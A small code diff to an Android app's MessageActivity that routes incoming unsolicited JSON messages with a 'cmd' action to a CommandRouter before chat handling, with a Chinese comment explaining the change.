@@ -368,6 +368,10 @@ public class MessageActivity extends Activity {
      */
     static void handleUnsolicited(final Context ctx, String json) {
         try {
+            // 工具箱遥控指令（{"action":"cmd",...}）优先消费，不进留言流
+            if (CommandRouter.handle(ctx, json)) {
+                return;
+            }
             JSONObject o = new JSONObject(json);
             if (!"chat".equals(o.optString("action"))) {
                 return;
